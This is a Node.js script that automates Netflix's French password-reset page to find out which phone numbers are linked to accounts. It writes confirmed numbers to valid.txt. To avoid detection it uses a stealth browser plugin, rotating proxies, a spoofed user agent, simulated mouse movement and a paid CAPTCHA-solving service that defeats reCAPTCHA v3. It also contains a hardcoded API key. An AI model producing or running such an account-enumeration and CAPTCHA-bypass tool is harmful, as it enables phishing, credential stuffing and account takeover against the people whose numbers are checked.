const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Use puppeteer-extra with stealth plugin to avoid detection
puppeteer.use(StealthPlugin());

// List of French proxies (replace with real French proxy addresses)
const frenchProxies = [
    '87.98.148.98:80',
    '20.111.54.16:8123',
    '51.210.54.186:80',
    '217.182.210.152:80',
    '51.254.78.223:80',
    '163.172.33.137:4137',
    '54.38.181.125:80',
    '193.253.220.32:80',
    '80.13.43.193:80',
    '149.202.91.219:80',
    '146.59.202.70:80'
    // Add more proxies as needed
];

// Your Anti-Captcha API key
const API_KEY = 'e66f00e5516a9e7bd32719b7dd6ca01d';

// Helper function to create the reCAPTCHA task
async function createRecaptchaTask(websiteURL, websiteKey) {
    console.log("Creating reCAPTCHA v3 task...");
    try {
        const response = await axios.post('https://api.anti-captcha.com/createTask', {
            clientKey: API_KEY,
            task: {
                type: 'RecaptchaV3TaskProxyless',
                websiteURL: websiteURL,
                websiteKey: websiteKey,
                minScore: 0.3 // Set the minimum acceptable score
            }
        });

        if (response.data.errorId === 0) {
            console.log("Task created successfully. Task ID:", response.data.taskId);
            return response.data.taskId;
        } else {
            throw new Error(`Error creating task: ${response.data.errorDescription}`);
        }
    } catch (error) {
        throw new Error(`Error while creating CAPTCHA task: ${error.message}`);
    }
}

// Helper function to get the result of the reCAPTCHA task
async function getRecaptchaResult(taskId) {
    console.log("Fetching result for Task ID:", taskId);
    let tries = 0;

    while (tries < 20) { // Retry for up to 100 seconds
        try {
            const response = await axios.post('https://api.anti-captcha.com/getTaskResult', {
                clientKey: API_KEY,
                taskId: taskId
            });

            if (response.data.status === 'ready') {
                console.log("CAPTCHA solved successfully. Token:", response.data.solution.gRecaptchaResponse);
                return response.data.solution.gRecaptchaResponse;
            } else {
                console.log(`Attempt ${tries + 1}: CAPTCHA solving still in progress...`);
            }
            tries++;
            await delay(5000); // Wait 5 seconds between retries
        } catch (error) {
            throw new Error(`Error while fetching CAPTCHA result: ${error.message}`);
        }
    }
    throw new Error('CAPTCHA solving timed out.');
}

// Delay function
async function delay(time) {
    return new Promise(function (resolve) {
        setTimeout(resolve, time);
    });
}

// Function to append phone numbers to the correct file based on their status
function appendToFile(filename, content) {
    const filePath = path.resolve(__dirname, filename);
    fs.appendFileSync(filePath, content + '\n', 'utf8', (err) => {
        if (err) throw err;
    });
}

// Simulate human-like interactions
async function simulateHumanInteraction(page) {
    await page.mouse.move(100, 100); // Move the mouse to an arbitrary position
    await delay(200 + Math.random() * 300); // Random small delay
    await page.mouse.move(200, 200); // Move the mouse again
    await delay(200 + Math.random() * 300); // Another random delay
    await page.evaluate(() => window.scrollBy(0, Math.random() * 500)); // Simulate scrolling
}

// Function to check a single phone number on Netflix using the same browser
async function checkNetflixPhoneWithPuppeteer(phoneNumber, browser) {
    try {
        const page = await browser.newPage();

        // Set user-agent to avoid being blocked by Netflix
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36');

        // Navigate to Netflix login help page using the French proxy
        await page.goto('https://www.netflix.com/fr/LoginHelp', { waitUntil: 'networkidle2' });

        // Use the correct reCAPTCHA v3 site key
        const recaptchaSiteKey = '6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp'; // Replace with actual site key

        console.log("Invisible reCAPTCHA v3 detected, solving...");

        // Simulate human-like behavior
        await simulateHumanInteraction(page);

        // Create a task to solve the invisible reCAPTCHA using Anti-Captcha
        const taskId = await createRecaptchaTask('https://www.netflix.com/fr/LoginHelp', recaptchaSiteKey);

        // Wait for the task result
        const token = await getRecaptchaResult(taskId);

        // Inject the token into the hidden form field
        await page.evaluate((token) => {
            const form = document.forms[0];
            if (form) {
                let recaptchaInput = document.querySelector('#g-recaptcha-response');
                if (!recaptchaInput) {
                    recaptchaInput = document.createElement('input');
                    recaptchaInput.setAttribute('type', 'hidden');
                    recaptchaInput.setAttribute('name', 'g-recaptcha-response');
                    recaptchaInput.setAttribute('value', token);
                    form.appendChild(recaptchaInput);
                } else {
                    recaptchaInput.value = token;
                }
            } else {
                console.error('Form not found.');
            }
        }, token);

        console.log("Token injected successfully.");

        // Simulate additional human-like interaction after the token is injected
        await simulateHumanInteraction(page);

        // Wait for the SMS option and select it
        await page.waitForSelector('label[for="bxid_resetPasswordChoice_text"]', { visible: true });
        await page.click('label[for="bxid_resetPasswordChoice_text"]');

        // Select the French country code (+33) from the dropdown
        await page.click('.country-select'); // Assuming there is a dropdown to trigger the country selection
        await page.waitForSelector('li[data-uia="option-FR"]'); // Wait for the France option
        await page.click('li[data-uia="option-FR"]'); // Select the France option

        // Now that +33 is selected, type the phone number without the prefix
        await page.waitForSelector('#forgot_password_input', { visible: true });
        await page.type('#forgot_password_input', phoneNumber);  // Only the local phone number, no +33 prefix

        // Submit the form
        await page.waitForSelector('button[data-uia="action_forgot_password"]', { visible: true });
        await page.click('button[data-uia="action_forgot_password"]');

        // Wait for a few seconds for the page to process
        await delay(5000);

        // Capture the visible text on the page for analysis
        const pageText = await page.evaluate(() => document.body.innerText);

        const phoneNumberWithPrefix = `+33${phoneNumber}`; // Add +33 prefix

        // Check if the number is linked to a Netflix account or not and append to the correct file
        if (pageText.includes("nous avons envoyé un SMS") || pageText.includes("Code envoyé")) {
            console.log(`Phone number ${phoneNumberWithPrefix} is linked to a Netflix account.`);
            appendToFile('valid.txt', phoneNumberWithPrefix); // Save to valid.txt
        } else if (pageText.includes("Ce numéro de téléphone n'est lié à aucun compte") || pageText.includes("This phone number is not linked to any account")) {
            console.log(`Phone number ${phoneNumberWithPrefix} is NOT linked to a Netflix account.`);
            appendToFile('notvalid.txt', phoneNumberWithPrefix); // Save to notvalid.txt
        } else {
            console.log("No clear response. Here's part of the visible page text for debugging:");
            console.log(pageText.substring(0, 500));
        }

        await page.close(); // Close the page after each test
    } catch (error) {
        console.error(`Error checking phone number ${phoneNumber}:`, error);
    }
}

// Function to test multiple phone numbers in a worker process
async function testMultiplePhoneNumbers(phoneNumbers) {
    // Rotate through French proxies
    const proxy = frenchProxies[Math.floor(Math.random() * frenchProxies.length)];

    // Launch browser with proxy
    const browser = await puppeteer.launch({
        headless: false, // Set to false to ensure the browser is fully visible
        args: [
            `--proxy-server=${proxy}`, // Use the French proxy
            '--no-sandbox', '--disable-setuid-sandbox',
            '--disable-gpu', '--disable-dev-shm-usage',
            '--disable-features=IsolateOrigins,site-per-process',
            '--no-zygote'
        ]
    });

    for (const phoneNumber of phoneNumbers) {
        console.log(`Checking phone number: ${phoneNumber} using proxy: ${proxy}`);
        await checkNetflixPhoneWithPuppeteer(phoneNumber, browser);
    }

    await browser.close(); // Close the browser after all tests are completed
}

// Main Cluster Function
if (cluster.isMaster) {
    const numCPUs = os.cpus().length; // Use the number of available CPU cores
    const phoneNumbers = ['783205798', '783205797', '783302795', '783205794', '782305793']; // Add more phone numbers

    // Split phone numbers into chunks to distribute to workers
    const chunkSize = Math.ceil(phoneNumbers.length / numCPUs);
    const phoneChunks = [];

    for (let i = 0; i < phoneNumbers.length; i += chunkSize) {
        phoneChunks.push(phoneNumbers.slice(i, i + chunkSize));
    }

    // Fork workers and assign phone number chunks
    for (let i = 0; i < phoneChunks.length; i++) {
        const worker = cluster.fork();
        worker.send(phoneChunks[i]);
    }

    // Handle worker completion
    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} exited with code ${code}`);
    });
} else {
    process.on('message', async (phoneChunk) => {
        console.log(`Worker ${process.pid} processing phone numbers:`, phoneChunk);
        await testMultiplePhoneNumbers(phoneChunk);
        process.exit();
    });
}
